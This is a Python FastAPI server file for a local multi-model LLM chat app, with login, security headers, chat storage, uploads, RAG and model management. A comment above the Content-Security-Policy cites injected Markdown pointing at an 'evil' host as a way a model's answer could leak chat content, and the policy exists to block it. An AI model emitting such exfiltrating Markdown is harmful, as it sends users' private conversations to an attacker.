"""FastAPI app: JSON/NDJSON API under /api, static frontend under /."""
import asyncio
import json
from typing import AsyncIterator, Literal
from urllib.parse import quote

from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import FileResponse, JSONResponse, Response, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

from app import auth, chats, config, export, history, rag, titles, uploads, websearch
from app.config import ROOT
from app.modes import chat, council, speedtest
from app.ollama import OllamaClient, OllamaError

app = FastAPI(title="Local Council")

# Reachable without login, so the page can ask whether a password is needed and log in.
OPEN_PATHS = {"/api/auth", "/api/login"}

# Only files from this server: no remote scripts, and no remote images, so injected Markdown like
# ![](http://evil/?q=…) in an answer cannot send chat content anywhere. Inline styles are needed by KaTeX.
SECURITY_HEADERS = {
    "Content-Security-Policy": (
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; "
        "font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; "
        "form-action 'self'"
    ),
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "no-referrer",
}


@app.middleware("http")
async def guard(request: Request, call_next):
    cfg = config.load()
    if not auth.host_allowed(request.headers.get("host", ""), cfg):
        return JSONResponse({"detail": "Host nicht erlaubt. In config.json unter server.allowed_hosts eintragen."},
                            status_code=400)
    if request.url.path.startswith("/api/") and request.url.path not in OPEN_PATHS:
        if auth.enabled(cfg) and not auth.valid_token(cfg, request.cookies.get(auth.COOKIE)):
            return JSONResponse({"detail": "Anmeldung erforderlich."}, status_code=401)
    response = await call_next(request)
    for name, value in SECURITY_HEADERS.items():
        response.headers.setdefault(name, value)
    return response


class SpeedtestRequest(BaseModel):
    prompt: str = Field(min_length=1)
    models: list[str] | None = None
    parallel: bool | None = None
    record: bool = True  # False for benchmark warm-up runs


class CouncilRequest(BaseModel):
    question: str = Field(min_length=1)
    members: list[str] | None = None
    synthesizer: str | None = None
    rounds: int | None = Field(default=None, ge=0, le=5)
    parallel: bool | None = None


class Message(BaseModel):
    role: Literal["user", "assistant"]
    content: str
    attachments: list[str] = []  # upload ids, see app.uploads


class ChatRequest(BaseModel):
    messages: list[Message] = Field(min_length=1)
    model: str | None = None
    system: str | None = None
    options: dict | None = None  # e.g. {"temperature": 0.7, "num_ctx": 8192}, on top of ollama.options
    think: bool | None = None
    knowledge: str | None = None  # knowledge base id (RAG)
    tools: bool = False
    web: bool = False


class ModelRequest(BaseModel):
    model: str = Field(min_length=1)


def ndjson(events: AsyncIterator[dict]) -> StreamingResponse:
    async def body():
        try:
            async for event in events:
                yield json.dumps(event, ensure_ascii=False) + "\n"
        except Exception as e:
            yield json.dumps({"type": "error", "error": str(e)}, ensure_ascii=False) + "\n"

    return StreamingResponse(
        body(),
        media_type="application/x-ndjson",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


def _unique(models: list[str]) -> list[str]:
    return list(dict.fromkeys(m for m in models if m))


def public_config(cfg: dict) -> dict:
    """The config without the password hash and session secret."""
    return {k: v for k, v in cfg.items() if k != "auth"}


@app.get("/api/config")
def get_config():
    return public_config(config.load())


@app.put("/api/config")
def put_config(cfg: dict):
    cfg.pop("auth", None)  # the password is only changed via /api/auth/password
    return public_config(config.update(cfg))


# ---------- Login (optional) ----------

class LoginRequest(BaseModel):
    password: str


@app.get("/api/auth")
def get_auth(request: Request):
    cfg = config.load()
    on = auth.enabled(cfg)
    return {"enabled": on, "logged_in": not on or auth.valid_token(cfg, request.cookies.get(auth.COOKIE))}


def _with_cookie(response: Response, cfg: dict) -> Response:
    response.set_cookie(auth.COOKIE, auth.make_token(cfg), max_age=auth.MAX_AGE, httponly=True, samesite="lax")
    return response


@app.post("/api/login")
async def login(req: LoginRequest, request: Request):
    cfg = config.load()
    if not auth.enabled(cfg):
        return {"ok": True}
    client = request.client.host if request.client else "?"
    if auth.login_blocked(client):
        raise HTTPException(429, "Zu viele falsche Versuche. Bitte in 15 Minuten wieder versuchen.")
    if not auth.check_password(cfg, req.password):
        auth.record_failure(client)
        await asyncio.sleep(1)  # slows down guessing
        raise HTTPException(401, "Falsches Passwort.")
    auth.reset_failures(client)
    return _with_cookie(JSONResponse({"ok": True}), cfg)


@app.post("/api/logout")
def logout():
    response = JSONResponse({"ok": True})
    response.delete_cookie(auth.COOKIE)
    return response


@app.put("/api/auth/password")
def put_password(req: LoginRequest):
    """Sets a new password (logs out all other devices) or removes it with an empty string."""
    auth.set_password(req.password)
    cfg = config.load()
    response = JSONResponse({"enabled": auth.enabled(cfg)})
    return _with_cookie(response, cfg) if auth.enabled(cfg) else response


@app.get("/api/models")
async def get_models():
    try:
        return await OllamaClient.from_config(config.load()).list_models()
    except OllamaError as e:
        raise HTTPException(502, str(e))


@app.get("/api/models/loaded")
async def get_loaded_models():
    try:
        return await OllamaClient.from_config(config.load()).loaded_models()
    except OllamaError as e:
        raise HTTPException(502, str(e))


@app.post("/api/models/load")
async def load_model(req: ModelRequest):
    return await _set_loaded(req.model, True)


@app.post("/api/models/unload")
async def unload_model(req: ModelRequest):
    return await _set_loaded(req.model, False)


async def _set_loaded(model: str, load: bool):
    client = OllamaClient.from_config(config.load())
    try:
        await client.set_loaded(model, load)
        return await client.loaded_models()
    except OllamaError as e:
        raise HTTPException(502, str(e))


@app.post("/api/models/show")
async def show_model(req: ModelRequest):
    try:
        return await OllamaClient.from_config(config.load()).show(req.model)
    except OllamaError as e:
        raise HTTPException(502, str(e))


@app.post("/api/speedtest")
def post_speedtest(req: SpeedtestRequest):
    cfg = config.load()
    models = _unique(req.models if req.models is not None else cfg["speedtest"]["models"])
    if not models:
        raise HTTPException(400, "Keine Modelle für den Speed-Test ausgewählt.")
    parallel = req.parallel if req.parallel is not None else cfg["speedtest"]["parallel"]
    return ndjson(speedtest.run(OllamaClient.from_config(cfg), models, req.prompt, parallel, req.record))


@app.get("/api/speedtest/history")
def get_speedtest_history():
    return history.load_all()


class PruneRequest(BaseModel):
    keep: int = Field(default=3, ge=0)


@app.post("/api/speedtest/history/prune")
def prune_speedtest_history(req: PruneRequest):
    return {"removed": history.prune(req.keep)}


@app.post("/api/council")
def post_council(req: CouncilRequest):
    cfg = config.load()
    c = cfg["council"]
    members = _unique(req.members if req.members is not None else c["members"])
    if len(members) < 2:
        raise HTTPException(400, "Der Council braucht mindestens zwei Modelle.")
    synthesizer = req.synthesizer or c["synthesizer"] or members[0]
    rounds = req.rounds if req.rounds is not None else c["rounds"]
    parallel = req.parallel if req.parallel is not None else c["parallel"]
    return ndjson(council.run(OllamaClient.from_config(cfg), members, synthesizer, req.question, rounds, parallel))


@app.post("/api/chat")
def post_chat(req: ChatRequest):
    cfg = config.load()
    model = req.model or cfg["chat"]["model"]
    if not model:
        raise HTTPException(400, "Kein Chat-Modell ausgewählt.")
    system = req.system if req.system is not None else cfg["chat"]["system"]
    messages = [uploads.expand(m.model_dump()) for m in req.messages]
    return ndjson(chat.run(OllamaClient.from_config(cfg), model, messages, system, req.options, req.think,
                           knowledge=req.knowledge, use_tools=req.tools, web=req.web, cfg=cfg))


class ChatDoc(BaseModel, extra="allow"):
    """A stored conversation. Extra fields are kept, so the frontend can add new ones without a schema change."""
    title: str = ""
    model: str = ""
    messages: list[dict] = []


@app.get("/api/chats")
def list_chats():
    return chats.list_all()


@app.get("/api/chats/search")
def search_chats(q: str = ""):
    return chats.search(q)


@app.get("/api/chats/export")
def export_all_chats():
    return Response(export.all_as_zip(), media_type="application/zip",
                    headers={"Content-Disposition": 'attachment; filename="local-council-chats.zip"'})


class TitleRequest(BaseModel):
    model: str | None = None
    question: str
    answer: str


@app.post("/api/chats/title")
async def make_title(req: TitleRequest):
    cfg = config.load()
    model = cfg["chat"].get("title_model") or req.model
    if not model:
        raise HTTPException(400, "Kein Modell für den Titel.")
    try:
        return {"title": await titles.generate(OllamaClient.from_config(cfg), model, req.question, req.answer)}
    except OllamaError as e:
        raise HTTPException(502, str(e))


@app.get("/api/chats/{chat_id}")
def get_chat(chat_id: str):
    try:
        return chats.get(chat_id)
    except chats.ChatNotFound:
        raise HTTPException(404, "Chat nicht gefunden.")


@app.put("/api/chats/{chat_id}")
def put_chat(chat_id: str, chat: ChatDoc):
    if not chats.valid_id(chat_id):
        raise HTTPException(400, "Ungültige Chat-ID.")
    return chats.save(chat_id, chat.model_dump())


@app.patch("/api/chats/{chat_id}")
def patch_chat(chat_id: str, fields: dict):
    try:
        return chats.summary(chats.patch(chat_id, fields))
    except chats.ChatNotFound:
        raise HTTPException(404, "Chat nicht gefunden.")


@app.get("/api/chats/{chat_id}/export")
def export_chat(chat_id: str, format: Literal["md", "json"] = "md"):
    try:
        chat = chats.get(chat_id)
    except chats.ChatNotFound:
        raise HTTPException(404, "Chat nicht gefunden.")
    body = export.to_markdown(chat) if format == "md" else export.to_json(chat)
    media = "text/markdown" if format == "md" else "application/json"
    name = export.filename(chat, format)
    return Response(body, media_type=f"{media}; charset=utf-8",
                    headers={"Content-Disposition": f"attachment; filename*=UTF-8''{quote(name)}"})


@app.delete("/api/chats/{chat_id}")
def delete_chat(chat_id: str):
    try:
        chats.delete(chat_id)
    except chats.ChatNotFound:
        raise HTTPException(404, "Chat nicht gefunden.")
    return {"deleted": chat_id}


@app.post("/api/uploads")
async def post_upload(request: Request, name: str):
    """The file is the raw request body (no multipart), its name a query parameter."""
    too_big = HTTPException(413, f"Die Datei ist größer als {uploads.MAX_BYTES // 2**20} MB.")
    if int(request.headers.get("content-length") or 0) > uploads.MAX_BYTES:
        raise too_big
    data = bytearray()
    async for part in request.stream():  # also limited without Content-Length (chunked upload)
        data += part
        if len(data) > uploads.MAX_BYTES:
            raise too_big
    try:
        return uploads.store(name, bytes(data), request.headers.get("content-type", ""))
    except uploads.UploadError as e:
        raise HTTPException(400, str(e))


@app.get("/api/uploads/{upload_id}")
def get_upload(upload_id: str):
    try:
        m = uploads.meta(upload_id)
        return FileResponse(uploads.file_path(upload_id), media_type=m["type"], filename=m["name"],
                            content_disposition_type="inline")
    except uploads.UploadError as e:
        raise HTTPException(404, str(e))


# ---------- Knowledge bases (RAG) and web search ----------

class CollectionRequest(BaseModel):
    name: str = Field(min_length=1)


class DocumentRequest(BaseModel):
    upload_id: str


def _rag_call(fn, *args):
    try:
        return fn(*args)
    except rag.RagError as e:
        raise HTTPException(404, str(e))


@app.get("/api/rag")
def list_collections():
    return rag.list_all()


@app.post("/api/rag")
def create_collection(req: CollectionRequest):
    return rag.create(req.name, config.load()["rag"]["embed_model"])


@app.delete("/api/rag/{cid}")
def delete_collection(cid: str):
    _rag_call(rag.delete, cid)
    return {"deleted": cid}


@app.post("/api/rag/{cid}/documents")
def add_document(cid: str, req: DocumentRequest):
    """Indexes an uploaded file; streams {"type": "progress", "done", "total"} and finally the collection."""
    _rag_call(rag.get, cid)
    client = OllamaClient.from_config(config.load())

    async def events():
        try:
            async for event in rag.add_document(client, cid, req.upload_id):
                yield event
        except (rag.RagError, uploads.UploadError, OllamaError) as e:
            yield {"type": "error", "error": str(e)}

    return ndjson(events())


@app.delete("/api/rag/{cid}/documents/{upload_id}")
def remove_document(cid: str, upload_id: str):
    return _rag_call(rag.remove_document, cid, upload_id)


@app.post("/api/web/test")
async def test_web():
    w = config.load()["web"]
    try:
        results = await websearch.search(w["searxng_url"], "Ollama", w.get("max_results", 5))
    except websearch.WebError as e:
        raise HTTPException(502, str(e))
    return {"count": len(results), "first": results[0]["title"] if results else None}


app.mount("/", StaticFiles(directory=ROOT / "static", html=True), name="static")
